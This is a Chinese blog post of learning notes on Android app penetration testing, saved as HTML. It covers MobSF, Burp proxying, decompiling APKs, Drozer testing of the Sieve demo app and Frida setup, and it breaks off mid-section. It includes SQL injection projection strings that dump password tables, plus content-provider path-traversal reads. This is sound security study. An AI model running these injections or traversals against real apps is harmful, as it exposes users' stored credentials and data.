@@ -1,0 +1,915 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>APP渗透测试学习 | 6right</title>
+
+<link rel="shortcut icon" href="https://liangyueliangyue.github.io/favicon.ico?v=1686021349967">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://liangyueliangyue.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            6right
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/friends" class="menu gt-a-link">
+                    友链
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1686021349967"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    APP渗透测试学习
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-02-22 ·
+                    </time>
+                    
+                        <a href="https://liangyueliangyue.github.io/tag/9meamuYXO/" class="post-tags">
+                            # APP
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/img_convert/12a561881ddbb0d642b1dddf31536315.png" alt="img" loading="lazy"></figure>
+<h1 id="全局扫描">全局扫描</h1>
+<h2 id="mobsf">mobsf</h2>
+<h3 id="安装要求">安装要求</h3>
+<ul>
+<li>Install <a href="https://git-scm.com/download/win">Git</a></li>
+<li>Install <a href="https://www.python.org/">Python <strong>3.8-3.9</strong></a></li>
+<li>Install <a href="https://www3.ntu.edu.sg/home/ehchua/programming/howto/JDK_Howto.html">JDK 8+</a></li>
+<li>Install <a href="https://visualstudio.microsoft.com/thank-you-downloading-visual-studio/?sku=BuildTools&amp;rel=16">Microsoft Visual C++ Build Tools</a></li>
+<li>Install <a href="https://slproweb.com/products/Win32OpenSSL.html">OpenSSL (non-light)</a></li>
+<li>Download &amp; Install <a href="https://wkhtmltopdf.org/downloads.html">wkhtmltopdf</a> as per the <a href="https://github.com/JazzCore/python-pdfkit/wiki/Installing-wkhtmltopdf">wiki instructions</a></li>
+<li>Add the folder that contains <code>wkhtmltopdf</code> binary to environment variable PATH.</li>
+</ul>
+<h3 id="安装">安装</h3>
+<pre><code>git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
+cd Mobile-Security-Framework-MobSF
+setup.bat
+</code></pre>
+<p>记得访问然后改host文件</p>
+<pre><code>https://ipaddress.com/website/raw.githubusercontent.com
+</code></pre>
+<h3 id="启动">启动</h3>
+<pre><code>run.bat
+localhost:8000
+</code></pre>
+<h1 id="服务端app测试">服务端APP测试</h1>
+<h2 id="夜神模拟器">夜神模拟器</h2>
+<p>多个Android 版本（有些APP可能不兼容）</p>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/img_convert/9cb466a241f34c44f692cc2a1e26a8dd.png" alt="image-20211230184700252" loading="lazy"></figure>
+<p>首先确保和电脑同一网段（能够互通），然后去设置代理</p>
+<p>设置-WiFi-长按WiFi名字-修改网络 设置代理为手动<br>
+代理服务器主机名为burp的IP地址（也就是本机的） ,端口为监听端口</p>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/img_convert/bfbf3ee7d5f34fb3b4de7f3e46f4f50b.png" alt="image-20211230185619711" loading="lazy"></figure>
+<p>burp配置</p>
+<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/img_convert/1f9da9232905865f1f30e3b60e87b116.png" alt="image-20211230185728063" loading="lazy"></figure>
+<p>在burp上就可以接收到模拟器上的流量了</p>
+<p>模拟器中打开浏览器地址栏输入<strong>http://burp</strong>，右上角<strong>下载证书</strong></p>
+<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/img_convert/bd7db55ec1f1fe5cd50dd5a9a8d3cde6.png" alt="image-20211230194255959" loading="lazy"></figure>
+<p>打开Amaze左边最近访问文件找到刚刚那个文件重命名后缀为.cer</p>
+<figure data-type="image" tabindex="6"><img src="https://img-blog.csdnimg.cn/img_convert/71dae234ec889e6cce681efbfc46f57e.png" alt="image-20211230194735936" loading="lazy"></figure>
+<p>我这里改不掉，只能通过文件助手找到共享目录然后修改后缀名</p>
+<figure data-type="image" tabindex="7"><img src="https://img-blog.csdnimg.cn/img_convert/b5f3500d0c059eb85a2d646facb0cf28.png" alt="image-20211230195002073" loading="lazy"></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5b7071e65f03346dec0b9753662f8ee0.png" alt="image-20211230194406185" loading="lazy">------退回<strong>首页</strong>------<strong>设置</strong>------<strong>安全</strong>------<strong>从SD卡安装</strong>------找到刚刚那个.cer文件------然后安装即可，名字随便，完美</p>
+<figure data-type="image" tabindex="8"><img src="https://img-blog.csdnimg.cn/img_convert/2bddbfe1cfd106965029007e89dd40e4.png" alt="image-20211230195028331" loading="lazy"></figure>
+<p>然后回到主页-设置-安全-从sd卡安装，找到cer文件然后安装</p>
+<figure data-type="image" tabindex="9"><img src="https://img-blog.csdnimg.cn/img_convert/b891e8a5dc3d27bdcdc0fe5d0061fd6a.png" alt="image-20211230195150462" loading="lazy"></figure>
+<p>安装完成可以收到流量包了</p>
+<p>但是模拟器会有一致证书错误的问题，在浏览器右上角点开设置</p>
+<figure data-type="image" tabindex="10"><img src="https://img-blog.csdnimg.cn/img_convert/5971e68743b6248bdeea49e922addc55.png" alt="image-20211230195611459" loading="lazy"></figure>
+<p>隐私与安全-显示安全警告关闭再返回就一切正常了</p>
+<figure data-type="image" tabindex="11"><img src="https://img-blog.csdnimg.cn/img_convert/ea48ed4e60d287ffd98c7453dcdb360b.png" alt="image-20211230195658683" loading="lazy"></figure>
+<h2 id="真机">真机</h2>
+<p>电脑开启热点，然后手机连上</p>
+<figure data-type="image" tabindex="12"><img src="https://img-blog.csdnimg.cn/img_convert/bd94b5b390311fd08753aa43a93738b7.png" alt="image-20211230193510460" loading="lazy"></figure>
+<p>设置代理为上面ip的网关（我这里是.1 -&gt;192.168.137.202）</p>
+<p>保存之后，先用电脑访问指定ip端口下载证书</p>
+<figure data-type="image" tabindex="13"><img src="https://img-blog.csdnimg.cn/img_convert/33f7df01e6b0e97c8bb71834c99970e9.png" alt="image-20211230193639390" loading="lazy"></figure>
+<p>将证书后缀名改为.cer，传输到手机上</p>
+<figure data-type="image" tabindex="14"><img src="https://img-blog.csdnimg.cn/img_convert/5aeead3c0687c636d7831406ff966af2.png" alt="image-20211230192444533" loading="lazy"></figure>
+<p>安装即可</p>
+<h1 id="客户端app测试">客户端APP测试</h1>
+<h2 id="静态测试">静态测试</h2>
+<h3 id="资源文件获取">资源文件获取</h3>
+<p>可以提取出图片文件和布局文件进行使用查看，主要查看res文件下xml文件、AndroidManifest.xml和图片。</p>
+<h4 id="apktools">APKtools</h4>
+<pre><code>https://ibotpeaches.github.io/Apktool/install/
+</code></pre>
+<p>windows配置过程（其实也就是环境变量）</p>
+<p>首先将bat文件下载到指定目录</p>
+<figure data-type="image" tabindex="15"><img src="https://img-blog.csdnimg.cn/img_convert/e5be75ee15f7ded156855502a7a0243b.png" alt="image-20220105133032208" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://img-blog.csdnimg.cn/img_convert/6498bb0cae11a7b3bc311a20a173c2b9.png" alt="image-20220105132940827" loading="lazy"></figure>
+<p>然后将jar文件下载到指定目录</p>
+<pre><code>https://bitbucket.org/iBotPeaches/apktool/downloads/
+</code></pre>
+<p>然后为指定目录配置环境变量</p>
+<figure data-type="image" tabindex="17"><img src="https://img-blog.csdnimg.cn/img_convert/d1b8e80754dd3f4dbbb487161d84f5dd.png" alt="image-20220105133229272" loading="lazy"></figure>
+<p>然后命令行就可以执行apktool了</p>
+<figure data-type="image" tabindex="18"><img src="https://img-blog.csdnimg.cn/img_convert/f56658d408890f8c82a6bcb5c7905e46.png" alt="image-20220105133258784" loading="lazy"></figure>
+<h4 id="使用方法">使用方法</h4>
+<ul>
+<li>
+<p>输入 apktool d 123.apk</p>
+<ul>
+<li>d 代表解码（反编译）该123.APK</li>
+</ul>
+</li>
+<li>
+<p>输入 apktool b 123 -o 111.apk</p>
+<ul>
+<li>b  代表把当前反编译出来的123文件重建（重打包）成111.apk
+<ul>
+<li>apk重打包后需要重新进行签名</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<figure data-type="image" tabindex="19"><img src="https://img-blog.csdnimg.cn/img_convert/5221ea4614457d72483c14952725eeac.png" alt="image-20220105143307843" loading="lazy"></figure>
+<h3 id="apk反编译-java源码">apk反编译-&gt;java源码</h3>
+<h4 id="dex2jar">dex2jar</h4>
+<p>将classes.dex转化成jar文件</p>
+<h4 id="使用">使用</h4>
+<p>将APK直接解压（修改后缀名为.zip，然后解压）后，可以看到目录下包含一个classes.dex文件。</p>
+<p>如下图所示，而我们的源码就在这个classes.dex 文件中。</p>
+<figure data-type="image" tabindex="20"><img src="https://img-blog.csdnimg.cn/img_convert/989aa4282bb73606938c9e53ba41a828.png" alt="image-20220105143948524" loading="lazy"></figure>
+<p>然后放入d2j-dex2jar目录下</p>
+<pre><code>.\d2j-dex2jar.bat classes.dex
+</code></pre>
+<figure data-type="image" tabindex="21"><img src="https://img-blog.csdnimg.cn/img_convert/157de79f20e85ebb8f26c764141dab00.png" alt="image-20220105145034777" loading="lazy"></figure>
+<p>会得到classes-dex2jar.jar文件</p>
+<h3 id="java源码逆向">java源码逆向</h3>
+<h4 id="jd-gui">jd-gui</h4>
+<p>查看jar文件进行漏洞分析</p>
+<h4 id="jebjadx">jeb，jadx</h4>
+<p>更加直接获取</p>
+<p>解包全局找http，当web来打</p>
+<p>全局扫描可以用mobsf，组件等测试使用的drozer（mobsf动态扫描也可以但是结果不太准确），hook使用的是XposedBridge和frida。以上是个人经验</p>
+<h2 id="动态测试">动态测试</h2>
+<h3 id="四大组件">四大组件</h3>
+<h4 id="activity">Activity</h4>
+<blockquote>
+<p>Activity是Android组件中最基本也是最为常见用的四大组件之一。</p>
+<p>Activity是一个应用程序组件，提供一个屏幕，用户可以用来交互为了完成某项任务。</p>
+<p>Activity中所有操作都与用户密切相关，是一个负责与用户交互的组件，可以通过setContentView(View)来显示指定控件。</p>
+<p>在一个android应用中，一个Activity通常就是一个单独的屏幕，它上面可以显示一些控件也可以监听并处理用户的事件做出响应。Activity之间通过Intent进行通信。</p>
+</blockquote>
+<h4 id="service">Service</h4>
+<blockquote>
+<p>Service 也是Android 四大组件之一，有着非常重要的作用。</p>
+<p>Service 被设计为在后台长时间执行而不需要提供页面的任务。</p>
+<p>Service有两种启动方式，startService与bindService</p>
+</blockquote>
+<h4 id="content-provider">content provider</h4>
+<p>（1）android平台提供了Content Provider使一个应用程序的指定数据集提供给其他应用程序。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。<br>
+（2）只有需要在多个应用程序间共享数据是才需要内容提供者。例如，通讯录数据被多个应用程序使用，且必须存储在一个内容提供者中。它的好处是统一数据访问方式。<br>
+（3）ContentProvider实现数据共享。ContentProvider用于保存和获取数据，并使其对所有应用程序可见。这是不同应用程序间共享数据的唯一方式，因为android没有提供所有应用共同访问的公共存储区。<br>
+（4）开发人员不会直接使用ContentProvider类的对象，大多数是通过ContentResolver对象实现对ContentProvider的操作。</p>
+<p>（5）ContentProvider使用URI来唯一标识其数据集，这里的URI以content://作为前缀，表示该数据由ContentProvider来管理。</p>
+<h4 id="broadcastreceiver">BroadcastReceiver</h4>
+<p>在Android中，广播是一种广泛运用的在应用程序之间传输信息的机制。而广播接收器是对发送出来的广播进行过滤接受并响应的一类组件。可以使用广播接收器来让应用对一个外部时间做出响应。例如，当电话呼入这个外部事件到来时，可以利用广播接收器进行处理。当下载一个程序成功完成时，仍然可以利用广播接收器进行处理。广播接收器不NotificationManager来通知用户这些事情发生了。广播接收器既可以在AndroidManifest.xml中注册，也可以在运行时的代码中使用Context.registerReceive（）进行注册。只要是注册了，当事件来临时，即使程序没有启动，系统也在需要的时候启动程序。各种应用还可以通过使用Context.sendBroadcast（）将它们自己的Intent广播给其他应用程序。</p>
+<h3 id="组件测试-drozer">组件测试-Drozer</h3>
+<p>Drozer是一款领先的Android安全测试框架</p>
+<pre><code>https://labs.f-secure.com/tools/drozer/
+</code></pre>
+<h4 id="环境及工具安装"><strong>环境及工具安装</strong></h4>
+<p>运行Drozer需要java环境、python27环境、adb调试工具、真实手机、夜神安卓模拟器、Drozer-2.4.4、drozer-agent-2.3.4。</p>
+<p>操作系统：Windows10专业版</p>
+<p>JAVA环境：jdk1.8.0_241</p>
+<p>Python环境：Python 2.7.17</p>
+<p><strong>adb即安卓调试桥，是一个命令行窗口工具，用于PC端与安卓设备进行交互</strong>，官网下载安装包和Android通用驱动，一键安装，配置环境变量。</p>
+<pre><code>https://adbshell.com/downloads
+</code></pre>
+<p>添加好Path环境变量，命令行测试</p>
+<figure data-type="image" tabindex="22"><img src="https://img-blog.csdnimg.cn/25c6349dd8e446929e934c7689b8169c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>4、Drozer安装</p>
+<p>首先从官网下载电脑端drozer和手机端安装包</p>
+<pre><code>官网：https://labs.f-secure.com/tools/drozer/
+</code></pre>
+<p>打开msi文件直接安装，再安装过程中会遇到设置运行环境的问题，因为检测到的环境是python3，所以要手动指定python 2.7环境，一路next即可。</p>
+<p>5、Drozer-agent安装</p>
+<p>这里夜神模拟器直接指定即可</p>
+<h4 id="adb登录设备">adb登录设备</h4>
+<p>一般adb devices即可</p>
+<figure data-type="image" tabindex="23"><img src="https://img-blog.csdnimg.cn/img_convert/aa8f756509b50da1030658507ac7aaf1.png" alt="image-20220214141252801" loading="lazy"></figure>
+<p>如果无法连接，可以尝试重启模拟器</p>
+<p>或者找到NoxVMHandle.exe对应的PID，这里是2608，再根据此PID查找模拟器和电脑连接的TCP端口,并找到127.0.0.1:62xxx的地址。</p>
+<pre><code>tasklist | findstr &quot;Nox&quot;  --查看任务列表
+netstat -ano | findstr PID    --显示此PID的网络连接情况
+adb connect 127.0.0.1:62001
+</code></pre>
+<figure data-type="image" tabindex="24"><img src="https://img-blog.csdnimg.cn/img_convert/6ae7ea53b085101570b0a71e080711e1.png" alt="image-20220214141550204" loading="lazy"></figure>
+<figure data-type="image" tabindex="25"><img src="https://img-blog.csdnimg.cn/img_convert/ad8f57b71dcb0df1e0e70cc134667aaf.png" alt="image-20220214141540981" loading="lazy"></figure>
+<pre><code>adb shell
+</code></pre>
+<p>tips：这里为什么adb老是重连是因为nox自带adb，将自己adb覆盖掉nox/bin下的adb.exe和nox_adb.exe即可</p>
+<h4 id="drozer连接手机">Drozer连接手机</h4>
+<p>首先配置drozer agent</p>
+<figure data-type="image" tabindex="26"><img src="https://img-blog.csdnimg.cn/img_convert/da31233148f4d6505e1aa0aa2706ce5c.png" alt="image-20220214141722158" loading="lazy"></figure>
+<p>开启</p>
+<figure data-type="image" tabindex="27"><img src="https://img-blog.csdnimg.cn/img_convert/47274b20f52d7f72d8425b8dad33174d.png" alt="image-20220214141745395" loading="lazy"></figure>
+<p>开始连接，drozer Server默认监听端口为31415，同样需要与主机上的31415端口进行通信。</p>
+<pre><code>adb forward tcp:31415 tcp:31415
+--端口转发
+</code></pre>
+<p>启动drozer</p>
+<pre><code>drozer console connect
+</code></pre>
+<figure data-type="image" tabindex="28"><img src="https://img-blog.csdnimg.cn/img_convert/1516d6a2d07302e04829945dd948d31d.png" alt="image-20220214145247822" loading="lazy"></figure>
+<h4 id="实战演练">实战演练</h4>
+<p>测试app可从drozer官网下载得到</p>
+<p>1、安装测试app</p>
+<figure data-type="image" tabindex="29"><img src="https://img-blog.csdnimg.cn/img_convert/89dc92dcda09e6ee293c7e445355086d.png" alt="image-20220214151807454" loading="lazy"></figure>
+<p>2、打开app根据提示为其设置一些信息，以供后期使用（这里密码最小16位，不能含有特殊字符，PIN码和其他信息随便填）</p>
+<p>密码：qwertyuiopasdfghjkl，pin：1229</p>
+<p>new password</p>
+<pre><code>service：test
+username：lyy
+email：2000083869@qq.com
+password:123456
+</code></pre>
+<p>3.首先获取Android设备里的指定app</p>
+<pre><code>run app.package.list -f sieve
+</code></pre>
+<p>会乱码，所以需要修改中的drozer\modules\app\package.py开头加上</p>
+<pre><code>import sys
+reload(sys)
+sys.setdefaultencoding('utf-8')
+</code></pre>
+<figure data-type="image" tabindex="30"><img src="https://img-blog.csdnimg.cn/img_convert/6f2cb8f3d0c0836ecad928abd5bd6997.png" alt="image-20220214153349152" loading="lazy"></figure>
+<p>再次运行</p>
+<figure data-type="image" tabindex="31"><img src="https://img-blog.csdnimg.cn/img_convert/a2a8cc0f24471f769dd8a10fc52a4c7b.png" alt="image-20220214153603254" loading="lazy"></figure>
+<p>4、获取一下该应用的基本信息，可以看到该APP的安装路径及数据目录</p>
+<pre><code>run app.package.info -a 包名
+run app.package.info -a com.mwr.example.sieve
+</code></pre>
+<figure data-type="image" tabindex="32"><img src="https://img-blog.csdnimg.cn/img_convert/1f732de7115eef1a0e306fb51b40072f.png" alt="image-20220214153638707" loading="lazy"></figure>
+<p>5、接下来看看该app是否有暴露的组件攻击面，组件暴露可能导致敏感信息泄露、拒绝服务、权限提升绕过，界面劫持、远程代码执行等安全漏洞</p>
+<pre><code>run app.package.attacksurface 包名
+run app.package.attacksurface com.mwr.example.sieve
+</code></pre>
+<figure data-type="image" tabindex="33"><img src="https://img-blog.csdnimg.cn/img_convert/fb4bdee174a06aa3a2af828d88b5b734.png" alt="image-20220214153728821" loading="lazy"></figure>
+<p>根据测试的返回信息可以看出暴露了3个activity组件，2个provisers组件，2个services组件，并且可被调试。</p>
+<p>6、对暴露的activity组件进行攻击，可以显示一些控件也可以监听并处理用户的事件做出响应。暴露的activity意味着可以被导出，可以分析是否存在数据泄露。</p>
+<pre><code>run app.activity.info -a 包名
+run app.activity.info -a com.mwr.example.sieve
+</code></pre>
+<figure data-type="image" tabindex="34"><img src="https://img-blog.csdnimg.cn/img_convert/24e05065bf0987a7182afecc2b817994.png" alt="image-20220214153935726" loading="lazy"></figure>
+<p>返回了三个组件信息，第一个应该是跟文件有关系，第二个应该是和登录有关系，第三个应该是和密码相关，那activity组件暴露意味着是否存在越权漏洞，绕过前端登录，一个个给他试试。</p>
+<p>7、启动暴露的组件信息</p>
+<p>启动一次需要重启adb一次？，且需要开着app</p>
+<pre><code>run app.activity.start -–component 包名 组件名
+run app.activity.start -–component com.mwr.example.sieve com.mwr.example.sieve.FileSelectActivity
+run app.activity.start -–component com.mwr.example.sieve com.mwr.example.sieve.MainLoginActivity
+run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
+</code></pre>
+<p>8、再测一下Content Provider组件，获取一下它的信息，可以获取到该app还和哪些应用程序有交互，使它指定的一些数据集提供给其他应用程序。那这里可以看到应该是有一些数据库交互，文件备份之类的信息。</p>
+<pre><code>run app.provider.info -a 包名
+run app.provider.info -a  com.mwr.example.sieve
+</code></pre>
+<figure data-type="image" tabindex="35"><img src="https://img-blog.csdnimg.cn/img_convert/ac81b8929811447d92704b752c7cb871.png" alt="image-20220214185950468" loading="lazy"></figure>
+<p>9、一个应用，肯定是有URI（统一资源标志符），用于指向一个资源的字符串，可以是指向本地，也可以是指向互联网，URL一定是URI，但URI不一定是URL。获取一下该app可以访问的URI：</p>
+<pre><code>run scanner.provider.finduris -a com.mwr.example.sieve
+</code></pre>
+<figure data-type="image" tabindex="36"><img src="https://img-blog.csdnimg.cn/img_convert/e9771ceaddef3f22e5cf84caeaa880ed.png" alt="image-20220214190030249" loading="lazy"></figure>
+<p>那这个信息就很敏感了</p>
+<p>10、访问一下URI所指向的资源</p>
+<pre><code>run app.provider.query 查询到的URI
+run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords
+</code></pre>
+<figure data-type="image" tabindex="37"><img src="https://img-blog.csdnimg.cn/img_convert/079c7222773168cb421399dd93c4a03a.png" alt="image-20220214190133717" loading="lazy"></figure>
+<p>11、对可以访问的URI进行SQL注入，来，试一下获取个人信息这个库所有的表。</p>
+<pre><code>run app.provider.query 查询到的URI --projection &quot;* FROM SQLITE_MASTER WHERE type='table';--&quot;
+run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type='table';--&quot;
+</code></pre>
+<figure data-type="image" tabindex="38"><img src="https://img-blog.csdnimg.cn/img_convert/6df95f489e8d411adbb572ac1dc8badf.png" alt="image-20220214200428273" loading="lazy"></figure>
+<p>12、获取一下Passwords和Key这两个表的数据，成功的通过SQL注入获取信息。当然，可以对这些可访问的URI尝试进行操作，如果在注入的过程中报错的话，那就存在SQL注入漏洞。</p>
+<pre><code>run app.provider.query URI --projection &quot;* FROM 表名;--&quot;
+run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM Passwords;--&quot;
+run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM Key;--&quot;
+</code></pre>
+<figure data-type="image" tabindex="39"><img src="https://img-blog.csdnimg.cn/img_convert/fb4213f6f0be3d229d2d7677f1a82e0e.png" alt="image-20220214200524685" loading="lazy"></figure>
+<p>13、当然也可以用模块进行批量的检测哪些URI存在SQL注入漏洞，可以看到很多的SQL注入漏洞，一个个试一下。</p>
+<pre><code>run scanner.provider.injection -a com.mwr.example.sieve
+</code></pre>
+<figure data-type="image" tabindex="40"><img src="https://img-blog.csdnimg.cn/img_convert/c8107a77fc18ba277b2686958502f96e.png" alt="image-20220214200601224" loading="lazy"></figure>
+<p>14、检测一下是否存在目录遍历漏洞，目录遍历可造成网站信息可被任意访问，敏感数据泄露，扫描到这么多呢。</p>
+<pre><code>run scanner.provider.traversal -a com.mwr.example.sieve
+</code></pre>
+<figure data-type="image" tabindex="41"><img src="https://img-blog.csdnimg.cn/img_convert/a93aea28a181c8656d4e942a900c46e2.png" alt="image-20220214200629464" loading="lazy"></figure>
+<p>15、由于Android基于Linux内核开发，那利用这个目录遍历漏洞查看一下hosts文件吧。</p>
+<pre><code>run app.provider.read 遍历路径/文件路径
+run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
+</code></pre>
+<figure data-type="image" tabindex="42"><img src="https://img-blog.csdnimg.cn/img_convert/9814b16c7982e1cfb2938aa9fe23ef3d.png" alt="image-20220214200921403" loading="lazy"></figure>
+<p>16、那顺便再把它的数据库也给下载下来，也算是要结束了。</p>
+<pre><code>run app.provider.download 数据库URI 本地路径/备份文件名.db
+run app.provider.download 数据库URI 本地路径/备份文件名.db
+</code></pre>
+<h3 id="hook-frida签名算法解决">hook-frida（签名算法解决）</h3>
+<p>Frida是一款基于<code>Python</code> + <code>JavaScript</code> 的hook框架，本质是一种动态插桩技术，可以插入一些代码到原生<code>app</code>的内存空间去（动态地监视和修改其行为）。其使用了<code>C-S</code>模型，利用Frida内核和谷歌V8引擎hook进程。可以轻松实现<code>Windows</code>、<code>Linux</code>、<code>Android</code>、<code>IOS</code>、<code>Mac</code>平台的动态插桩需求，单从<code>Android</code>层面理解，它可以实现<code>Java</code>层和<code>Native</code>层<code>Hook</code>操作。</p>
+<p><code>Frida</code>分为客户端和服务端，客户端通过<code>Python</code>代码将需要被注入的<code>JS</code>代码提交到服务端，然后接受服务端消息；服务端接受<code>JS</code>代码并将其注入到目标进程中，操作内存空间然后给客户端发送消息。</p>
+<p><strong>Hook原理</strong></p>
+<p><strong>Hook的本质就是劫持函数调用。由于处于Linux用户态，每个进程都有自己独立的进程空间，所以必须先注入到所要Hook的进程空间，修改其内存中的进程代码，替换其过程表的符号地址。在Android中一般是通过ptrace函数附加进程，然后向远程进程注入so库，从而达到监控以及远程进程关键函数挂钩。</strong></p>
+<p>一般Frida逆向三阶段：</p>
+<ol>
+<li>阶段一.分析程序执行逻辑，函数参数，函数返回值</li>
+<li>阶段二.在1的基础上对数据进行修改，执行流程的控制，核心方法的调用</li>
+<li>阶段三.在2的基础上实现对核心方法的封装调用,提供对外服务接口</li>
+</ol>
+<h4 id="安装-2">安装</h4>
+<p><strong>frida</strong></p>
+<pre><code>python3 -m pip install frida-tools
+</code></pre>
+<figure data-type="image" tabindex="43"><img src="https://img-blog.csdnimg.cn/img_convert/5e28218b74416b0a78b478abb329197b.png" alt="image-20220215093951429" loading="lazy"></figure>
+<p><strong>frida-server</strong></p>
+<p>要和frida对应</p>
+<pre><code>https://github.com/frida/frida/releases
+</code></pre>
+<p>安卓手机架构</p>
+<pre><code>adb shell getprop ro.product.cpu.abi  
+</code></pre>
+<p>给与权限然后运行</p>
+<pre><code>adb push frida-server-15.1.17-android-arm /data/local/tmp
+adb shell
+chmod 755 /data/local/tmp/frida-server-15.1.17-android-x86
+./frida-server-14.2.18-android-arm
+/data/local/tmp/frida-server-15.1.17-android-x86
+</code></pre>
+<p>端口映射</p>
+<pre><code>adb forward tcp:27042 tcp:27042
+adb forward tcp:27043 tcp:27043
+</code></pre>
+<p>查看进程，成功即可</p>
+<pre><code>frida-ps -U
+</code></pre>
+<figure data-type="image" tabindex="44"><img src="https://img-blog.csdnimg.cn/img_convert/3011b632c61f5b4f1f703a03cde5a892.png" alt="image-20220215095743380" loading="lazy"></figure>
+<h4 id="frida对指定方法进行trace">frida对指定方法进行trace</h4>
+<pre><code>frida-ps -U | grep frida 
+frida-trace -i &quot;open&quot; -U &quot;cn.gemini.k.fridatest&quot;
+</code></pre>
+<p>用的比较多都是frida帮我们生成好了hook代码，直接拿来使用就行，简单方便，但有时候我们想自己定制些功能怎么办?</p>
+<p>编写js进行hook</p>
+<p>接下来看下如何通过编写js代码来实现对安卓APP中某些方法的hook。<br>
+在hook之前首先要熟悉我们需要hook的目标方法，应用包名，参数等基础信息。这里简单写了个demo，后面我们都通过这个demo来学习。</p>
+<pre><code class="language-java">package com.example.frida;
+
+import androidx.appcompat.app.AppCompatActivity;
+import android.os.Bundle;
+import android.util.Log;
+public class MainActivity extends AppCompatActivity {
+    private String total = &quot;@@@###@@@&quot;;
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        while (true){
+
+            try {
+                Thread.sleep(1000);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+
+            fun(50,30);
+            Log.d(&quot;Minhal.string&quot; , fun(&quot;Fuck U!!!!!!!!!&quot;));
+        }
+
+    }
+    void fun(int x , int y ){
+        Log.d(&quot;Minhal.Sum&quot; , String.valueOf(x+y));
+    }
+    String fun(String x){
+        total +=x;
+        return x.toLowerCase();
+    }
+
+    String secret(){
+        return total;
+    }
+}
+</code></pre>
+<p>整理一下hook时需要的信息：<br>
